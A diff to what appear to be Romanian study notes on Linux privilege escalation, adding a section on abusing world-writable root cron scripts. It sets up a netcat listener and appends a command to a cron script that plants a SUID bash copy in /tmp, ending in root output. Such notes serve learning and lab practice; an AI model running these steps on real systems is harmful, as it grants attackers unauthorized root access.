@@ -110,3 +110,42 @@ sudo LD_PRELOAD=/tmp/preload.so apache2
 id
 * Output așteptat: uid=0(root) gid=0(root) groups=0(root)
 
+
+
+---
+
+## 6. Cron Jobs PrivEsc & Netcat Listener
+
+### Mecanism & Vulnerabilitate
+Task-urile din cron rulează strict cu permisiunile utilizatorului care le deține (al 6-lea câmp din crontab). Dacă un cronjob este deținut de `root`, dar scriptul executat are permisiuni de scriere pentru utilizatori obișnuiți (*world-writable*), un atacator poate injecta propriile comenzi în acel fișier. Când cron-ul rulează la intervalul stabilit, comenzile se vor executa direct cu drepturi de `root`.
+
+### Inspectare Cron Jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+
+Structura unei linii din /etc/crontab:
+* * * * * root /usr/local/bin/backup.sh
+(Minut | Oră | Zi din lună | Lună | Zi din săptămână | Utilizator | Comandă/Script)
+
+### Listener Netcat (nc -nvlp)
+Utilitar folosit pe mașina de atac pentru a aștepta o conexiune de intrare (Reverse Shell):
+nc -nvlp 4444
+
+Semnificația flag-urilor:
+* -n: Numeric-only. Dezactivează rezoluția DNS pentru viteză și stabilitate.
+* -v: Verbose. Afișează mesaje despre starea conexiunii (ex: "Connection received...").
+* -l: Listen. Pornește modul server/ascultare pentru conexiuni noi.
+* -p: Port. Definește numărul portului pe care ascultă listener-ul.
+
+### Exploatare Script Writable
+1. Deschide un listener pe mașina ta:
+nc -nvlp 4444
+
+2. Injectează un Reverse Shell sau acordare bit SUID în scriptul rulat de root:
+echo "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash" >> /usr/local/bin/backup.sh
+
+3. După ce minutul s-a scurs și cron-ul a rulat comanda:
+/tmp/rootbash -p
+id
+* Output așteptat: uid=0(root) gid=0(root) groups=0(root)
+
